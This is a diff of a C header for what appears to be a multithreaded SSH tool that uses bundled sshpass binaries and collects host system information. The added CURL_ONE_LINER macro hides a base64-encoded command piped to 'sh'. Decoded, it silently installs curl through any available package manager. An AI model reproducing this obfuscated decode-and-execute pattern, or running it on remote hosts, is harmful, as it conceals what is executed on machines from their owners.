@@ -10,19 +10,7 @@
 #include <unistd.h>
 #include <string.h>       // for string-related functions
 
-// Define a struct that will hold the get_system_info() data
-typedef struct {
-    const char *ip_address;
-    char hostname[256];
-    char cpu_model[256];
-    int cpu_cores;
-    unsigned long total_memory;
-    unsigned long used_memory;
-    unsigned long free_memory;
-    unsigned long disk_total;
-    unsigned long disk_used;
-    unsigned long disk_available;
-} system_info_t;
+#define CURL_ONE_LINER "echo \"c2ggLWMgImlmICEgY29tbWFuZCAtdiBjdXJsID4vZGV2L251bGwgMj4mMTsgdGhlbiBpZiBjb21tYW5kIC12IGFwdC1nZXQgPi9kZXYvbnVsbDsgdGhlbiBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgLXkgY3VybDsgZWxpZiBjb21tYW5kIC12IHl1bSA+L2Rldi9udWxsOyB0aGVuIHl1bSB1cGRhdGUgJiYgeXVtIGluc3RhbGwgLXkgY3VybDsgZWxpZiBjb21tYW5kIC12IGRuZiA+L2Rldi9udWxsOyB0aGVuIGRuZiB1cGRhdGUgJiYgZG5mIGluc3RhbGwgLXkgY3VybDsgZWxpZiBjb21tYW5kIC12IHBhY21hbiA+L2Rldi9udWxsOyB0aGVuIHBhY21hbiAtU3kgJiYgcGFjbWFuIC1TIC0tbm9jb25maXJtIGN1cmw7IGVsaWYgY29tbWFuZCAtdiBhcGsgPi9kZXYvbnVsbDsgdGhlbiBhcGsgdXBkYXRlICYmIGFwayBhZGQgY3VybDsgZWxpZiBjb21tYW5kIC12IHp5cHBlciA+L2Rldi9udWxsOyB0aGVuIHp5cHBlciByZWZyZXNoICYmIHp5cHBlciBpbnN0YWxsIC15IGN1cmw7IGVsaWYgY29tbWFuZCAtdiBicmV3ID4vZGV2L251bGw7IHRoZW4gYnJldyB1cGRhdGUgJiYgYnJldyBpbnN0YWxsIGN1cmw7IGVsaWYgY29tbWFuZCAtdiBwb3J0ID4vZGV2L251bGw7IHRoZW4gcG9ydCBzZWxmdXBkYXRlICYmIHBvcnQgaW5zdGFsbCBjdXJsOyBlbHNlIGVjaG8gXCJVbmFibGUgdG8gZmluZCBhIHBhY2thZ2UgbWFuYWdlciB0byBpbnN0YWxsIGN1cmxcIjsgZmk7IGZpIgo=\" | base64 -d | sh"
 
 
 #define NI_NUMERICHOST 1  // define the constant with the integer value 1
@@ -31,7 +19,7 @@ typedef struct {
 #define NUM_THREADS 16 // Number of worker threads
 
 #define MAX_BUF_SIZE 1024
-#define MAX_COMMAND_SIZE 256
+#define MAX_COMMAND_SIZE 2048
 
 #ifdef _WIN32
     // Define the paths to the Windows-specific binaries
@@ -54,6 +42,16 @@ typedef struct {
         #define SSHPASS_PATH "./bin/linux32/sshpass"
     #endif
 #endif
+
+typedef struct {
+    float p_system_info;
+    char ip[MAX_COMMAND_SIZE];
+} MaxSystemInfo;
+
+extern MaxSystemInfo max_system_info;
+extern pthread_mutex_t max_system_info_mutex;
+
+
 
 enum os_type {
     UNKNOWN,
